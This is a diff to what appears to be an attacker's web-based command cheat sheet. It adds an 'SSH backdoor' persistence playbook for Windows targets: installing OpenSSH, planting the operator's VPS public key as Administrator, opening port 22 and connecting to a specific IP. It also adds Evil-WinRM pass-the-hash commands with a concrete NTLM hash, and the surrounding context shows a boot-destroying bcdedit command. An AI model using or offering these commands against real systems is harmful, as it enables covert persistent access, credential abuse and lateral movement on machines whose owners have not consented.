@@ -113,6 +113,8 @@
   .tag.cloud.active { background: #03a9f4; color: #000; }
   .tag.chaos { color: #ff2a6d; border-color: #ff2a6d; }
   .tag.chaos.active { background: #ff2a6d; color: #fff; }
+  .tag.ssh { color: #8bc34a; border-color: #8bc34a; }
+  .tag.ssh.active { background: #8bc34a; color: #000; }
   .cmd-tag.c2 { color: #ff6b35; border-color: #ff6b35; }
   .cmd-tag.privesc { color: #9b59b6; border-color: #9b59b6; }
   .cmd-tag.persist { color: #e74c3c; border-color: #e74c3c; }
@@ -124,6 +126,7 @@
   .cmd-tag.recon { color: #4caf50; border-color: #4caf50; }
   .cmd-tag.cloud { color: #03a9f4; border-color: #03a9f4; }
   .cmd-tag.chaos { color: #ff2a6d; border-color: #ff2a6d; }
+  .cmd-tag.ssh { color: #8bc34a; border-color: #8bc34a; }
   .cmd-count {
     text-align: center;
     font-size: 0.6rem;
@@ -240,6 +243,7 @@
   <div class="tag c2" data-filter="c2">C2</div>
   <div class="tag cloud" data-filter="cloud">Cloud</div>
   <div class="tag chaos" data-filter="chaos">Chaos</div>
+  <div class="tag ssh" data-filter="ssh">SSH</div>
   <div class="tag ps" data-filter="ps">PowerShell</div>
   <div class="tag linux" data-filter="linux">Linux</div>
   <div class="tag vps" data-filter="vps">VPS</div>
@@ -3295,6 +3299,124 @@ const COMMANDS = [
     code: "bcdedit /delete {default}",
     tags: ["cmd", "chaos"],
     accent: "#ff2a6d"
+  },
+  // ═══════════════════════════════════════════════════════════════
+  // SSH BACKDOOR - Cleanest persistent access (run as SYSTEM)
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "[SSH-BACKDOOR-1] Install OpenSSH Server",
+    desc: "Installs Windows OpenSSH server. Takes 1-2 minutes. Run as SYSTEM or Admin.",
+    code: "Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0",
+    tags: ["ps", "persist", "ssh", "playbook"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "[SSH-BACKDOOR-2] Start SSH Service",
+    desc: "Starts the sshd service. Must run after install completes.",
+    code: "Start-Service sshd",
+    tags: ["ps", "persist", "ssh", "playbook"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "[SSH-BACKDOOR-3] Set SSH to Auto-Start",
+    desc: "SSH server starts automatically on boot. Persistence without scheduled tasks.",
+    code: "Set-Service -Name sshd -StartupType Automatic",
+    tags: ["ps", "persist", "ssh", "playbook"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "[SSH-BACKDOOR-4] Create .ssh Directory",
+    desc: "Creates .ssh folder for Administrator. Required before adding keys.",
+    code: "mkdir C:\\Users\\Administrator\\.ssh -Force",
+    tags: ["ps", "persist", "ssh", "playbook"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "[SSH-BACKDOOR-5] Add VPS Public Key",
+    desc: "Adds your VPS pubkey. Replace YOUR_PUBKEY with actual key from 'cat ~/.ssh/id_ed25519.pub' on VPS.",
+    code: "Add-Content C:\\Users\\Administrator\\.ssh\\authorized_keys 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAXXXXXXXXXXXXXXXXXXXXXXX root@srv01'",
+    tags: ["ps", "persist", "ssh", "playbook"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "[SSH-BACKDOOR-6] Fix Key Permissions",
+    desc: "Sets correct permissions on authorized_keys. SSH rejects keys with wrong perms.",
+    code: "icacls C:\\Users\\Administrator\\.ssh\\authorized_keys /inheritance:r /grant SYSTEM:F /grant Administrators:F",
+    tags: ["cmd", "persist", "ssh", "playbook"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "[SSH-BACKDOOR-7] Open Firewall",
+    desc: "Opens port 22 in Windows Firewall. Usually auto-opened but run to be sure.",
+    code: "netsh advfirewall firewall add rule name='SSH' dir=in action=allow protocol=tcp localport=22",
+    tags: ["cmd", "persist", "ssh", "firewall"],
+    accent: "#e74c3c"
+  },
+  {
+    title: "[SSH-BACKDOOR-VERIFY] Check SSH Service",
+    desc: "Should show sshd Running. If Stopped, run Start-Service sshd.",
+    code: "Get-Service sshd | Select Status, StartType",
+    tags: ["ps", "ssh", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "[SSH-BACKDOOR-VERIFY] Check Port 22 Open",
+    desc: "Should show LISTENING on port 22. If not, check firewall.",
+    code: "netstat -an | findstr :22",
+    tags: ["cmd", "ssh", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "VPS: Get Your Public Key",
+    desc: "Copy this output and paste into SSH-BACKDOOR-5 command.",
+    code: "cat ~/.ssh/id_ed25519.pub",
+    tags: ["linux", "vps", "ssh"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS: SSH to Target as Administrator",
+    desc: "Connect to target via SSH. Clean shell with history and tab completion.",
+    code: "ssh Administrator@4.200.69.210",
+    tags: ["linux", "vps", "ssh", "lateral", "playbook"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS: SSH to Target as adminvm1",
+    desc: "Connect as adminvm1 user. Use if Administrator blocked.",
+    code: "ssh adminvm1@4.200.69.210",
+    tags: ["linux", "vps", "ssh", "lateral"],
+    accent: "#00ff41"
+  },
+  // ═══════════════════════════════════════════════════════════════
+  // EVIL-WINRM - PTH with good shell
+  // ═══════════════════════════════════════════════════════════════
+  {
+    title: "VPS: Install Evil-WinRM",
+    desc: "Installs evil-winrm for Pass-the-Hash with proper shell. One-time setup.",
+    code: "apt install evil-winrm -y",
+    tags: ["linux", "vps", "lateral"],
+    accent: "#00ff41"
+  },
+  {
+    title: "VPS: Evil-WinRM PTH as adminvm1",
+    desc: "PTH with proper shell. Tab completion, colors, upload/download. Requires WinRM port 5985.",
+    code: "evil-winrm -i 4.200.69.210 -u adminvm1 -H a4840a9c4a6828c0d5b5dbfa3bc567b0",
+    tags: ["linux", "vps", "lateral", "playbook"],
+    accent: "#00ff41"
+  },
+  {
+    title: "[TARGET] Enable WinRM",
+    desc: "Enables WinRM on target. Required for evil-winrm. Run as Admin/SYSTEM.",
+    code: "Enable-PSRemoting -Force",
+    tags: ["ps", "lateral"],
+    accent: "#00bcd4"
+  },
+  {
+    title: "[TARGET-VERIFY] Check WinRM",
+    desc: "Should show WinRM service Running on port 5985.",
+    code: "Get-Service WinRM | Select Status\\nnetstat -an | findstr 5985",
+    tags: ["ps", "lateral", "recon"],
+    accent: "#00f0ff"
   },
 ];
 
